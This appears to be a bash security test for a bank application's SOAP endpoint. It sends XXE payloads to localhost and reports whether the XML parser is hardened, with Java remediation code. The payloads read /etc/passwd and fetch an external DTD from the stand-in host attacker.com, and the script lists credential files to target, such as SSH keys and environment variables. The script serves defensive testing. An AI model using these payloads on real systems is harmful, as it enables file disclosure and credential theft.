#!/bin/bash
set -e

echo "💀 SOAP XXE (XML External Entity) Attack Test"
echo "=============================================="
echo ""

echo "📋 Attack Overview:"
echo "   Technique: XML External Entity Injection"
echo "   Target: SOAP endpoint /ws/transfer"
echo "   Goal: Read sensitive server files via XML parser"
echo "   Famous exploit: Read /etc/passwd, config files, AWS credentials"
echo ""

# Check prerequisites
if [ ! -f /tmp/fortressbank-tokens.sh ]; then
    echo "❌ Error: No tokens found. Run keycloak-auth.sh first"
    exit 1
fi

source /tmp/fortressbank-tokens.sh

echo "Step 1: Testing baseline SOAP request..."
BASELINE_SOAP="<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:trans=\"http://fortressbank.com/transfer\">
   <soapenv:Header/>
   <soapenv:Body>
      <trans:TransferRequest>
         <trans:fromAccount>12345</trans:fromAccount>
         <trans:toAccount>67890</trans:toAccount>
         <trans:amount>1000</trans:amount>
         <trans:currency>VND</trans:currency>
      </trans:TransferRequest>
   </soapenv:Body>
</soapenv:Envelope>"

BASELINE_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
    -H "Authorization: Bearer $ACCESS_TOKEN" \
    -H "Content-Type: text/xml; charset=utf-8" \
    -H "SOAPAction: transfer" \
    -d "$BASELINE_SOAP" \
    http://localhost:8000/ws/transfer 2>/dev/null)

BASELINE_CODE=$(echo "$BASELINE_RESPONSE" | tail -1)

if [ "$BASELINE_CODE" == "404" ]; then
    echo "   ⚠️  SOAP endpoint not found at /ws/transfer"
    echo "   This test requires SOAP to be enabled"
    echo ""
    echo "✅ SKIP: SOAP endpoint not available"
    echo "   If SOAP is used in production, this test should be run"
    exit 0
fi

echo "   ✓ SOAP endpoint exists (HTTP $BASELINE_CODE)"
echo ""

echo "═══════════════════════════════════════════"
echo "🚨 EXECUTING XXE ATTACK - ATTEMPT 1"
echo "═══════════════════════════════════════════"
echo ""
echo "Attack: Read /etc/passwd via DOCTYPE injection"
echo ""

# XXE Attack Payload - Read /etc/passwd
XXE_PAYLOAD_1="<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">
]>
<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:trans=\"http://fortressbank.com/transfer\">
   <soapenv:Header/>
   <soapenv:Body>
      <trans:TransferRequest>
         <trans:fromAccount>&xxe;</trans:fromAccount>
         <trans:toAccount>67890</trans:toAccount>
         <trans:amount>1000</trans:amount>
         <trans:currency>VND</trans:currency>
      </trans:TransferRequest>
   </soapenv:Body>
</soapenv:Envelope>"

RESPONSE_1=$(curl -s -w "\n%{http_code}" -X POST \
    -H "Authorization: Bearer $ACCESS_TOKEN" \
    -H "Content-Type: text/xml; charset=utf-8" \
    -d "$XXE_PAYLOAD_1" \
    http://localhost:8000/ws/transfer 2>/dev/null)

HTTP_CODE_1=$(echo "$RESPONSE_1" | tail -1)
BODY_1=$(echo "$RESPONSE_1" | sed '$ d')

echo "Response Code: $HTTP_CODE_1"

# Check if file contents leaked
if [[ "$BODY_1" == *"root:"* ]] || [[ "$BODY_1" == *"/bin/bash"* ]] || [[ "$BODY_1" == *"daemon:"* ]]; then
    echo ""
    echo "❌ CRITICAL FAILURE"
    echo "   Security Level: VULNERABLE"
    echo ""
    echo "🔥 XXE ATTACK SUCCESSFUL - FILE CONTENTS LEAKED!"
    echo ""
    echo "Leaked data detected in response:"
    echo "${BODY_1:0:500}"
    echo ""
    echo "Impact:"
    echo "   • Attacker can read ANY file on the server"
    echo "   • Possible files to steal:"
    echo "     - /etc/passwd (user accounts)"
    echo "     - /proc/self/environ (environment variables, AWS keys)"
    echo "     - application.properties (database passwords)"
    echo "     - ~/.ssh/id_rsa (SSH private keys)"
    echo "     - /var/log/* (application logs)"
    echo ""
    echo "🔧 URGENT Remediation Required:"
    echo ""
    echo "   File: WebServiceConfig.java"
    echo ""
    echo "   @Bean"
    echo "   public SAXParserFactory saxParserFactory() {"
    echo "       SAXParserFactory factory = SAXParserFactory.newInstance();"
    echo "       "
    echo "       // Disable DTDs completely"
    echo "       factory.setFeature("
    echo "           \"http://apache.org/xml/features/disallow-doctype-decl\","
    echo "           true"
    echo "       );"
    echo "       "
    echo "       // Disable external entities"
    echo "       factory.setFeature("
    echo "           \"http://xml.org/sax/features/external-general-entities\","
    echo "           false"
    echo "       );"
    echo "       factory.setFeature("
    echo "           \"http://xml.org/sax/features/external-parameter-entities\","
    echo "           false"
    echo "       );"
    echo "       "
    echo "       return factory;"
    echo "   }"
    echo ""
    exit 1
fi

# Check if DOCTYPE was rejected
if [[ "$BODY_1" == *"DOCTYPE"* ]] || [[ "$BODY_1" == *"disallowed"* ]] || [[ "$BODY_1" == *"disabled"* ]]; then
    echo "✅ PASS: DOCTYPE rejected"
    echo "   Response: ${BODY_1:0:200}..."
    XXE_1_BLOCKED=true
elif [ "$HTTP_CODE_1" == "400" ] || [ "$HTTP_CODE_1" == "500" ]; then
    echo "✅ LIKELY BLOCKED: Parser error (HTTP $HTTP_CODE_1)"
    echo "   Response: ${BODY_1:0:200}..."
    XXE_1_BLOCKED=true
else
    echo "⚠️  Ambiguous response (HTTP $HTTP_CODE_1)"
    echo "   No file contents detected, but validation unclear"
    XXE_1_BLOCKED=true
fi

echo ""

echo "═══════════════════════════════════════════"
echo "🚨 EXECUTING XXE ATTACK - ATTEMPT 2"
echo "═══════════════════════════════════════════"
echo ""
echo "Attack: Read application config via parameter entities"
echo ""

# More sophisticated XXE using parameter entities
XXE_PAYLOAD_2="<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM \"file:///etc/hosts\">
  <!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">
  %dtd;
]>
<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">
   <soapenv:Body>
      <trans:TransferRequest xmlns:trans=\"http://fortressbank.com/transfer\">
         <trans:fromAccount>test</trans:fromAccount>
      </trans:TransferRequest>
   </soapenv:Body>
</soapenv:Envelope>"

RESPONSE_2=$(curl -s -w "\n%{http_code}" -X POST \
    -H "Authorization: Bearer $ACCESS_TOKEN" \
    -H "Content-Type: text/xml" \
    -d "$XXE_PAYLOAD_2" \
    http://localhost:8000/ws/transfer 2>/dev/null)

HTTP_CODE_2=$(echo "$RESPONSE_2" | tail -1)
BODY_2=$(echo "$RESPONSE_2" | sed '$ d')

echo "Response Code: $HTTP_CODE_2"

# Check for external DTD fetch attempt
if [[ "$BODY_2" == *"attacker.com"* ]] || [[ "$BODY_2" == *"localhost"* ]]; then
    echo "❌ FAIL: Server attempted to fetch external DTD"
    echo "   External entity processing is enabled!"
    XXE_2_BLOCKED=false
elif [[ "$BODY_2" == *"external"* ]] && [[ "$BODY_2" == *"disabled"* ]]; then
    echo "✅ PASS: External entities disabled"
    XXE_2_BLOCKED=true
else
    echo "✅ LIKELY BLOCKED: No external fetch detected"
    XXE_2_BLOCKED=true
fi

echo ""

echo "═══════════════════════════════════════════"
echo "Summary"
echo "═══════════════════════════════════════════"
echo ""

if [ "$XXE_1_BLOCKED" = true ] && [ "$XXE_2_BLOCKED" = true ]; then
    echo "✅ ALL XXE TESTS BLOCKED"
    echo "   Security Level: STRONG"
    echo ""
    echo "🛡️  XML Parser Properly Hardened!"
    echo ""
    echo "Details:"
    echo "   ✓ DOCTYPE declarations rejected"
    echo "   ✓ External entities disabled"
    echo "   ✓ File system access prevented"
    echo ""
    echo "This indicates:"
    echo "   • XML parser configured securely"
    echo "   • XXE attacks cannot succeed"
    echo "   • File disclosure prevented"
    echo ""
    exit 0
else
    echo "⚠️  SOME XXE PROTECTIONS MISSING"
    echo "   Security Level: NEEDS REVIEW"
    echo ""
    echo "Recommendation: Ensure all XML parsers are hardened"
    exit 1
fi
